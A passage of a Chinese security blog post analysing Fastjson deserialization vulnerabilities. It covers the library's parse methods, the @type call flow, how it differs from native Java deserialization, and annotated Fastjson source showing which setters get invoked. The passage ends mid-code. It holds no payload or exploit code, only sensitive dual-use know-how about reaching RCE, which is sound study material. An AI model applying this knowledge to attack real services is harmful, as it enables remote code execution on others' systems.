class="site-page child faa-parent animated-hover" href="/about/"><i class="anzhiyufont anzhiyu-icon-paper-plane faa-tada" style="font-size: 0.9em;"></i><span> 关于本人</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/essay/"><i class="anzhiyufont anzhiyu-icon-lightbulb faa-tada" style="font-size: 0.9em;"></i><span> 站点动态</span></a></li><li><a class="site-page child faa-parent animated-hover" href="javascript:toRandomPost()"><i class="anzhiyufont anzhiyu-icon-shoe-prints1 faa-tada" style="font-size: 0.9em;"></i><span> 随便逛逛</span></a></li></ul></div></div></div><div id="nav-right"><div class="nav-button only-home" id="travellings_button" title="随机前往一个开往项目网站"><a class="site-page" onclick="anzhiyu.totraveling()" title="随机前往一个开往项目网站" href="javascript:void(0);" rel="external nofollow" data-pjax-state="external"><i class="anzhiyufont anzhiyu-icon-train"></i></a></div><div class="nav-button" id="randomPost_button"><a class="site-page" onclick="toRandomPost()" title="随机前往一个文章" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-dice"></i></a></div><div class="nav-button" id="search-button"><a class="site-page social-icon search" href="javascript:void(0);" title="搜索🔍" accesskey="s"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span> 搜索</span></a></div><input id="center-console" type="checkbox"/><label class="widget" for="center-console" title="中控台" onclick="anzhiyu.switchConsole();"><i class="left"></i><i class="widget center"></i><i class="widget right"></i></label><div id="console"><div class="console-card-group-reward"><ul class="reward-all console-card"><li class="reward-item"><a href="https://hongkong-img.oss-cn-hongkong.aliyuncs.com/blog-web-img/red_cross.png?x-oss-process=style/img-to-webp" target="_blank"><img class="post-qr-code-img" alt="红十字会" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hongkong-img.oss-cn-hongkong.aliyuncs.com/blog-web-img/red_cross.png?x-oss-process=style/img-to-webp"/></a><div class="post-qr-code-desc">红十字会</div></li><li class="reward-item"><a href="https://hongkong-img.oss-cn-hongkong.aliyuncs.com/blog-web-img/logo.png?x-oss-process=style/img-to-webp" target="_blank"><img class="post-qr-code-img" alt="LOGO" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hongkong-img.oss-cn-hongkong.aliyuncs.com/blog-web-img/logo.png?x-oss-process=style/img-to-webp"/></a><div class="post-qr-code-desc">LOGO</div></li></ul></div><div class="console-card-group"><div class="console-card-group-left"><div class="console-card" id="card-newest-comments"><div class="card-content"><div class="author-content-item-tips">互动</div><span class="author-content-item-title"> 最新评论</span></div><div class="aside-list"><span>正在加载中...</span></div></div></div><div class="console-card-group-right"><div class="console-card tags"><div class="card-content"><div class="author-content-item-tips">兴趣点</div><span class="author-content-item-title">寻找你感兴趣的领域</span><div class="card-tags"><div class="item-headline"></div><div class="card-tag-cloud"><a href="/tags/CVE/" style="font-size: 1.05rem;">CVE<sup>5</sup></a><a href="/tags/Chrome/" style="font-size: 1.05rem;">Chrome<sup>2</sup></a><a href="/tags/Fastjson/" style="font-size: 1.05rem;">Fastjson<sup>1</sup></a><a href="/tags/IPV6/" style="font-size: 1.05rem;">IPV6<sup>1</sup></a><a href="/tags/JAVA/" style="font-size: 1.05rem;">JAVA<sup>3</sup></a><a href="/tags/JAVA%E9%AB%98%E7%BA%A7/" style="font-size: 1.05rem;">JAVA高级<sup>1</sup></a><a href="/tags/JSON%E6%B3%A8%E5%85%A5/" style="font-size: 1.05rem;">JSON注入<sup>1</sup></a><a href="/tags/JS%E9%80%86%E5%90%91/" style="font-size: 1.05rem;">JS逆向<sup>2</sup></a><a href="/tags/NAS/" style="font-size: 1.05rem;">NAS<sup>3</sup></a><a href="/tags/NTLM/" style="font-size: 1.05rem;">NTLM<sup>1</sup></a><a href="/tags/PHP/" style="font-size: 1.05rem;">PHP<sup>2</sup></a><a href="/tags/RCE/" style="font-size: 1.05rem;">RCE<sup>18</sup></a><a href="/tags/TLS/" style="font-size: 1.05rem;">TLS<sup>1</sup></a><a href="/tags/cisp/" style="font-size: 1.05rem;">cisp<sup>2</sup></a><a href="/tags/esxi/" style="font-size: 1.05rem;">esxi<sup>1</sup></a><a href="/tags/html/" style="font-size: 1.05rem;">html<sup>1</sup></a><a href="/tags/javascript/" style="font-size: 1.05rem;">javascript<sup>1</sup></a><a href="/tags/kerberos/" style="font-size: 1.05rem;">kerberos<sup>1</sup></a><a href="/tags/nas/" style="font-size: 1.05rem;">nas<sup>1</sup></a><a href="/tags/%E4%B8%AD%E9%97%B4%E4%BB%B6/" style="font-size: 1.05rem;">中间件<sup>15</sup></a><a href="/tags/%E4%BA%91%E5%AD%98%E5%82%A8/" style="font-size: 1.05rem;">云存储<sup>1</sup></a><a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 1.05rem;">代码审计<sup>15</sup></a><a href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" style="font-size: 1.05rem;">反序列化<sup>4</sup></a><a href="/tags/%E5%9F%9F%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" style="font-size: 1.05rem;">域渗透测试<sup>2</sup></a><a href="/tags/%E5%AE%9E%E9%AA%8C/" style="font-size: 1.05rem;">实验<sup>1</sup></a><a href="/tags/%E5%AF%86%E7%A0%81/" style="font-size: 1.05rem;">密码<sup>8</sup></a><a href="/tags/%E5%BC%80%E5%8F%91/" style="font-size: 1.05rem;">开发<sup>4</sup></a><a href="/tags/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/" style="font-size: 1.05rem;">操作系统<sup>3</sup></a><a href="/tags/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/" style="font-size: 1.05rem;">横向移动<sup>3</sup></a><a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" style="font-size: 1.05rem;">渗透测试<sup>22</sup></a><a href="/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" style="font-size: 1.05rem;">漏洞复现<sup>22</sup></a><a href="/tags/%E7%A1%AC%E7%9B%98/" style="font-size: 1.05rem;">硬盘<sup>1</sup></a><a href="/tags/%E7%A7%81%E6%9C%89%E4%BA%91/" style="font-size: 1.05rem;">私有云<sup>1</sup></a><a href="/tags/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE/" style="font-size: 1.05rem;">网络协议<sup>2</sup></a><a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" style="font-size: 1.05rem;">网络安全<sup>10</sup></a><a href="/tags/%E7%BD%91%E7%BB%9C%E9%85%8D%E7%BD%AE/" style="font-size: 1.05rem;">网络配置<sup>1</sup></a><a href="/tags/%E8%AE%A4%E8%AF%81%E6%9C%BA%E5%88%B6/" style="font-size: 1.05rem;">认证机制<sup>3</sup></a><a href="/tags/%E8%AF%81%E4%B9%A6/" style="font-size: 1.05rem;">证书<sup>1</sup></a><a href="/tags/%E9%99%90%E5%88%B6%E7%BB%95%E8%BF%87/" style="font-size: 1.05rem;">限制绕过<sup>1</sup></a><a href="/tags/%E9%9D%B6%E5%9C%BA/" style="font-size: 1.05rem;">靶场<sup>3</sup></a></div></div><hr/></div></div><div class="console-card history"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-box-archiv"></i><span>文章</span></div><div class="card-archives"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-archive"></i><span>归档</span><a class="card-more-btn" href="/archives/" title="查看更多">
    <i class="anzhiyufont anzhiyu-icon-angle-right"></i></a></div><ul class="card-archive-list"><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2025/05/"><span class="card-archive-list-date">五月 2025</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">1</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2025/03/"><span class="card-archive-list-date">三月 2025</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">11</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2025/02/"><span class="card-archive-list-date">二月 2025</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">2</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2025/01/"><span class="card-archive-list-date">一月 2025</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">3</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/11/"><span class="card-archive-list-date">十一月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">1</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/10/"><span class="card-archive-list-date">十月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">2</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/09/"><span class="card-archive-list-date">九月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">1</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/08/"><span class="card-archive-list-date">八月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">5</span><span>篇</span></div></a></li></ul></div><hr/></div></div></div><div class="button-group"><div class="console-btn-item"><a class="darkmode_switchbutton" title="显示模式切换" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-moon"></i></a></div><div class="console-btn-item" id="consoleHideAside" onclick="anzhiyu.hideAsideBtn()" title="边栏显示控制"><a class="asideSwitch"><i class="anzhiyufont anzhiyu-icon-arrows-left-right"></i></a></div><div class="console-btn-item" id="consoleMusic" onclick="anzhiyu.musicToggle()" title="音乐开关"><a class="music-switch"><i class="anzhiyufont anzhiyu-icon-music"></i></a></div></div><div class="console-mask" onclick="anzhiyu.hideConsole()" href="javascript:void(0);"></div></div><div class="nav-button" id="nav-totop"><a class="totopbtn" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i><span id="percent" onclick="anzhiyu.scrollToDest(0,500)">0</span></a></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);" title="切换"><i class="anzhiyufont anzhiyu-icon-bars"></i></a></div></div></div></nav><div id="post-info"><div id="post-firstinfo"><div class="meta-firstline"><a class="post-meta-original">原创</a><span class="post-meta-categories"><span class="post-meta-separator"></span><i class="anzhiyufont anzhiyu-icon-inbox post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" itemprop="url">网络安全</a></span><span class="article-meta tags"><a class="article-meta__tags" href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" tabindex="-1" itemprop="url"> <span> <i class="anzhiyufont anzhiyu-icon-hashtag"></i>代码审计</span></a><a class="article-meta__tags" href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" tabindex="-1" itemprop="url"> <span> <i class="anzhiyufont anzhiyu-icon-hashtag"></i>网络安全</span></a><a class="article-meta__tags" href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" tabindex="-1" itemprop="url"> <span> <i class="anzhiyufont anzhiyu-icon-hashtag"></i>反序列化</span></a><a class="article-meta__tags" href="/tags/Fastjson/" tabindex="-1" itemprop="url"> <span> <i class="anzhiyufont anzhiyu-icon-hashtag"></i>Fastjson</span></a><a class="article-meta__tags" href="/tags/JSON%E6%B3%A8%E5%85%A5/" tabindex="-1" itemprop="url"> <span> <i class="anzhiyufont anzhiyu-icon-hashtag"></i>JSON注入</span></a></span></div></div><h1 class="post-title" itemprop="name headline">Fastjson安全漏洞分析</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="anzhiyufont anzhiyu-icon-calendar-days post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" itemprop="dateCreated datePublished" datetime="2024-03-13T16:00:00.000Z" title="发表于 2024-03-14 00:00:00">2024-03-14</time><span class="post-meta-separator"></span><i class="anzhiyufont anzhiyu-icon-history post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" itemprop="dateCreated datePublished" datetime="2025-05-08T12:19:18.250Z" title="更新于 2025-05-08 20:19:18">2025-05-08</time></span></div><div class="meta-secondline"><span class="post-meta-separator"></span><span class="post-meta-wordcount"><i class="anzhiyufont anzhiyu-icon-file-word post-meta-icon" title="文章字数"></i><span class="post-meta-label" title="文章字数">字数总计:</span><span class="word-count" title="文章字数">14k</span><span class="post-meta-separator"></span><i class="anzhiyufont anzhiyu-icon-clock post-meta-icon" title="阅读时长"></i><span class="post-meta-label" title="阅读时长">阅读时长:</span><span>64分钟</span></span><span class="post-meta-separator"></span><span class="post-meta-pv-cv" id="" data-flag-title="Fastjson安全漏洞分析"><i class="anzhiyufont anzhiyu-icon-fw-eye post-meta-icon"></i><span class="post-meta-label" title="阅读量">阅读量:</span><span id="busuanzi_value_page_pv"><i class="anzhiyufont anzhiyu-icon-spinner anzhiyu-spin"></i></span></span><span class="post-meta-separator">       </span><span class="post-meta-position" title="作者IP属地为长安"><i class="anzhiyufont anzhiyu-icon-location-dot"></i>长安</span></div></div></div><section class="main-hero-waves-area waves-area"><svg class="waves-svg" xmlns="http://www.w3.org/2000/svg" xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto"><defs><path id="gentle-wave" d="M -160 44 c 30 0 58 -18 88 -18 s 58 18 88 18 s 58 -18 88 -18 s 58 18 88 18 v 44 h -352 Z"></path></defs><g class="parallax"><use href="#gentle-wave" x="48" y="0"></use><use href="#gentle-wave" x="48" y="3"></use><use href="#gentle-wave" x="48" y="5"></use><use href="#gentle-wave" x="48" y="7"></use></g></svg></section><div id="post-top-cover"><img class="nolazyload" id="post-top-bg" src="https://hongkong-img.oss-cn-hongkong.aliyuncs.com/blog-web-img/t01d2db9ae92fa8184f.png?x-oss-process=style/img-to-webp"></div></header><main id="blog-container"><div class="layout" id="content-inner"><div id="post"><div class="post-ai-description"><div class="ai-title"><i class="anzhiyufont anzhiyu-icon-bilibili"></i><div class="ai-title-text">AI-摘要</div><i class="anzhiyufont anzhiyu-icon-arrow-rotate-right"></i><i class="anzhiyufont anzhiyu-icon-circle-dot" title="朗读摘要"></i><div id="ai-tag">GPT-4.0-turbo GPT</div></div><div class="ai-explanation">AI初始化中...</div><div class="ai-btn-box"><div class="ai-btn-item">介绍自己 🙈</div><div class="ai-btn-item">生成本文简介 👋</div><div class="ai-btn-item">推荐相关文章 📖</div><div class="ai-btn-item">前往主页 🏠</div><div class="ai-btn-item" id="go-tianli-blog">前往爱发电购买</div></div><script data-pjax src="/js/anzhiyu/ai_abstract.js"></script></div><article class="post-content" id="article-container" itemscope itemtype="https://blog.takake.com/posts/32163/"><header><a class="post-meta-categories" href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" itemprop="url">网络安全</a><a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" tabindex="-1" itemprop="url">代码审计</a><a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" tabindex="-1" itemprop="url">网络安全</a><a href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" tabindex="-1" itemprop="url">反序列化</a><a href="/tags/Fastjson/" tabindex="-1" itemprop="url">Fastjson</a><a href="/tags/JSON%E6%B3%A8%E5%85%A5/" tabindex="-1" itemprop="url">JSON注入</a><h1 id="CrawlerTitle" itemprop="name headline">Fastjson安全漏洞分析</h1><span itemprop="author" itemscope itemtype="http://schema.org/Person">Takake</span><time itemprop="dateCreated datePublished" datetime="2024-03-13T16:00:00.000Z" title="发表于 2024-03-14 00:00:00">2024-03-14</time><time itemprop="dateCreated datePublished" datetime="2025-05-08T12:19:18.250Z" title="更新于 2025-05-08 20:19:18">2025-05-08</time></header><h1 id="1-Fastjson分析"><a href="#1-Fastjson分析" class="headerlink" title="1.Fastjson分析"></a>1.Fastjson分析</h1><h2 id="1-1-fastjson常用方法"><a href="#1-1-fastjson常用方法" class="headerlink" title="1.1.fastjson常用方法"></a>1.1.fastjson常用方法</h2><p>首先需要明白JSON类的几个方法分别是，toJSONString，parse，parseObject(String text)，parseObject(String text, Class<T> clazz)。</p>
<ul>
<li>toJSONString 是将对象序列化为JSON字符串，实现的是序列化操作，调用的Getter方法。</li>
<li>parse是将字符串反序列化对象，实现的是反序列化操作，调用的是Setter方法。</li>
<li>parseObjectt(String text) 是先调用parse方法进行反序列化操作调用Setter方法，再调用toJSON进行序列化操作，调用Getter方法。</li>
<li>parseObject(String text, Class<T> clazz)是反序列化为指定的类，而不会调用toJSON方法进行序列化操作，因此只调用Setter方法。</li>
<li>以上所有方法在1.2.24默认请求下都可以通过@type注解指定反序列化的类。</li>
</ul>
<h2 id="1-2-调用流程分析"><a href="#1-2-调用流程分析" class="headerlink" title="1.2.调用流程分析"></a>1.2.调用流程分析</h2><p>那么我们来具体分析一下Fastjson中parseObjectt(String text) 通过**@type**指定后的调用流程。</p>
<ol>
<li><p>首先是通过调用<strong>JSON.parse</strong>方法，<strong>DefaultJSONParser.parseObject</strong>和<strong>DefaultJSONParser.parse</strong>方法去解析字符串，去处理不同的数据结构。</p>
</li>
<li><p>然后通过<strong>ParserConfig</strong>类中的<strong>createJavaBeanDeserializer</strong>和<strong>getDeserializer</strong>来创建一个反序列Bean，用于之后的调用。</p>
</li>
<li><p>再通过<strong>JavaBeanInfo</strong>类中的<strong>build</strong>判断需要调用哪些方法，然后通过该类的<strong>add</strong>方法将将创建的Bean添加到List&lt;FieldInfo&gt;用于之后的调用。</p>
</li>
<li><p>之后再返回到<strong>DefaultJSONParser.parseObject</strong>方法通过调用<strong>JavaBeanDeserializer.deserialze</strong>方法依次进行反序列。</p>
</li>
<li><p>再通过<strong>FieldDeserializer.setValue</strong>方法依次通过反射调用Bean的Setter方法对属性进行赋值。</p>
</li>
<li><p>再执行完成Setter方法后再回退到<strong>JSON.parseObject</strong>方法调用<strong>JSON.toJSON</strong>方法。</p>
</li>
<li><p>再调用<strong>SerializeConfig.getObjectWriter</strong>和<strong>SerializeConfig.getObjectWriter.createJavaBeanSerializer</strong>来创建javabean序列化对象。</p>
</li>
<li><p>再使用<strong>TypeUtils.buildBeanInfo</strong>和<strong>TypeUtils.computeGetters</strong>方法对需要调用的方法传入入到<strong>fieldInfoMap</strong>中用于之后的调用，包含Getter&#x2F;isXxxx方法。</p>
</li>
<li><p>之后回退到<strong>JSON.toJSON</strong>方法中首先使用<strong>getFieldValuesMap.JavaBeanSerializer</strong>方法对之前创建的<strong>Bean</strong>对象进行校验，判断获取到的Bean是否合法。</p>
</li>
<li><p>调用<strong>FieldSerializer.getPropertyValue</strong>方法来获取Bean中的值，主要是通过<strong>FieldInfo.get</strong>方法依次对<strong>fieldInfoMap</strong>中生成的对象方法进行调用。</p>
</li>
</ol>
<ul>
<li>调用流程图</li>
</ul>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hongkong-img.oss-cn-hongkong.aliyuncs.com/markdown-img/8748484894898984.jpg?x-oss-process=style/img-to-webp" alt="调用流程图"></p>
<h2 id="1-3-JAVA反序列化和FastJSON反序列化的区别"><a href="#1-3-JAVA反序列化和FastJSON反序列化的区别" class="headerlink" title="1.3.JAVA反序列化和FastJSON反序列化的区别"></a>1.3.JAVA反序列化和FastJSON反序列化的区别</h2><ol>
<li>通过流程分析我们可以判断，JSON反序列化其实是本质是通过反射来调用恶意的Getter和Setter&#x2F;isXxxx方法，来实现恶意的操作，而在JAVA反序列化中主要是通过JAVA反序列化时调用readObject来构造利用链实现恶意的操作。因此存在本质的区别。</li>
<li>FastjSON反序列化虽然也叫反序列化其实和JAVA反序列化不太沾边，因为JAVA反序列化其实是对二进制数据进行操作的，而JSON反序列化是基于字符串进行操作的。这点到有点像PHP的反序列化。</li>
<li>原生JAVA反序列化需要实现 <strong>Serializable</strong> 接口，JSON反序列化不需要</li>
<li>原生java反序列化受<strong>transient</strong>影响，JSON反序列化受注解配置影响。</li>
<li>不过最后构造链后一般都是执行RCE，通过反射或者类加载。</li>
<li>JAVA反序列化和JSON反序列化时，如果反序列化的对象已经加载过，则都不会调用静态代码块。但是构造代码块，JAVA反序列化不会调用，而JSON反序列化一定会调用。</li>
</ol>
<h2 id="1-4-哪些Setter和Getter-isXxx方法会被执行？"><a href="#1-4-哪些Setter和Getter-isXxx方法会被执行？" class="headerlink" title="1.4.哪些Setter和Getter&#x2F;isXxx方法会被执行？"></a>1.4.哪些Setter和Getter&#x2F;isXxx方法会被执行？</h2><ol>
<li>通过流程分析我们可以从<strong>JavaBeanInfo.build</strong>着手。</li>
</ol>
<h3 id="Setter"><a href="#Setter" class="headerlink" title="Setter()"></a>Setter()</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (Method method : methods) &#123; <span class="comment">//</span></span><br><span class="line">            <span class="type">int</span> <span class="variable">ordinal</span> <span class="operator">=</span> <span class="number">0</span>, serialzeFeatures = <span class="number">0</span>, parserFeatures = <span class="number">0</span>;</span><br><span class="line">            <span class="type">String</span> <span class="variable">methodName</span> <span class="operator">=</span> method.getName();</span><br><span class="line">    		<span class="comment">//判断方法名的长度不能小于4</span></span><br><span class="line">            <span class="keyword">if</span> (methodName.length() &lt; <span class="number">4</span>) &#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">    		<span class="comment">//不能是静态方法</span></span><br><span class="line">            <span class="keyword">if</span> (Modifier.isStatic(method.getModifiers())) &#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// support builder set</span></span><br><span class="line">    		<span class="comment">// 返回类型为空或者是类本身</span></span><br><span class="line">            <span class="keyword">if</span> (!(method.getReturnType().equals(Void.TYPE) || method.getReturnType().equals(method.getDeclaringClass()))) &#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            Class&lt;?&gt;[] types = method.getParameterTypes();</span><br><span class="line">    		<span class="comment">//参数类型必须只有一个</span></span><br><span class="line">            <span class="keyword">if</span> (types.length != <span class="number">1</span>) &#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="type">JSONField</span> <span class="variable">annotation</span> <span class="operator">=</span> method.getAnnotation(JSONField.class);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (annotation == <span class="literal">null</span>) &#123;</span><br><span class="line">                annotation = TypeUtils.getSuperMethodAnnotation(clazz, method);</span><br><span class="line">            &#125;</span><br><span class="line">			<span class="comment">//对字段属性的注解</span></span><br><span class="line">            <span class="keyword">if</span> (annotation != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="comment">//注解配置了是否序列化 eg:@JSONField(deserialize = false)</span></span><br><span class="line">                <span class="keyword">if</span> (!annotation.deserialize()) &#123;</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">                &#125;</span><br><span class="line">				<span class="meta">@JSONField(ordinal = 1)</span></span><br><span class="line">                ordinal = annotation.ordinal();</span><br><span class="line">                serialzeFeatures = SerializerFeature.of(annotation.serialzeFeatures());</span><br><span class="line">                parserFeatures = Feature.of(annotation.parseFeatures());</span><br><span class="line">				<span class="comment">//@JSONField(name = &quot;user_id&quot;) </span></span><br><span class="line">                <span class="keyword">if</span> (annotation.name().length() != <span class="number">0</span>) &#123;</span><br><span class="line">                    <span class="type">String</span> <span class="variable">propertyName</span> <span class="operator">=</span> annotation.name();</span><br><span class="line">                    add(fieldList, <span class="keyword">new</span> <span class="title class_">FieldInfo</span>(propertyName, method, <span class="literal">null</span>, clazz, type, ordinal, serialzeFeatures, parserFeatures, </span><br><span class="line">                                                 annotation, <span class="literal">null</span>, <span class="literal">null</span>));</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">			<span class="comment">//方法名必须以set开头</span></span><br><span class="line">            <span class="keyword">if</span> (!methodName.startsWith(<span class="string">&quot;set&quot;</span>)) &#123; <span class="comment">// TODO &quot;set&quot;的判断放在 JSONField 注解后面，意思是允许非 setter 方法标记 JSONField 注解？</span></span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="type">char</span> <span class="variable">c3</span> <span class="operator">=</span> methodName.charAt(<span class="number">3</span>);</span><br><span class="line"></span><br><span class="line">            String propertyName;</span><br><span class="line">    		<span class="comment">//对属性名特殊字符的一些处理</span></span><br><span class="line">            <span class="keyword">if</span> (Character.isUpperCase(c3) <span class="comment">//</span></span><br><span class="line">                || c3 &gt; <span class="number">512</span> <span class="comment">// for unicode method name</span></span><br><span class="line">            ) &#123;</span><br><span class="line">                <span class="keyword">if</span> (TypeUtils.compatibleWithJavaBean) &#123;</span><br><span class="line">                    propertyName = TypeUtils.decapitalize(methodName.substring(<span class="number">3</span>));</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    propertyName = Character.toLowerCase(methodName.charAt(<span class="number">3</span>)) + methodName.substring(<span class="number">4</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (c3 == <span class="string">&#x27;_&#x27;</span>) &#123;</span><br><span class="line">                propertyName = methodName.substring(<span class="number">4</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (c3 == <span class="string">&#x27;f&#x27;</span>) &#123;</span><br><span class="line">                propertyName = methodName.substring(<span class="number">3</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (methodName.length() &gt;= <span class="number">5</span> &amp;&amp; Character.isUpperCase(methodName.charAt(<span class="number">4</span>))) &#123;</span><br><span class="line">                propertyName = TypeUtils.decapitalize(methodName.substring(<span class="number">3</span>));</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> TypeUtils.getField(clazz, propertyName, declaredFields);</span><br><span class="line">            <span class="keyword">if</span> (field == <span class="literal">null</span> &amp;&amp; types[<span class="number">0</span>] == <span class="type">boolean</span>.class) &#123;</span><br><span class="line">                <span class="type">String</span> <span class="variable">isFieldName</span> <span class="operator">=</span> <span class="string">&quot;is&quot;</span> + Character.toUpperCase(propertyName.charAt(<span class="number">0</span>)) + propertyName.substring(<span class="number">1</span>);</span><br><span class="line">                field = TypeUtils.getField(clazz, isFieldName, declaredFields);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">    		<span 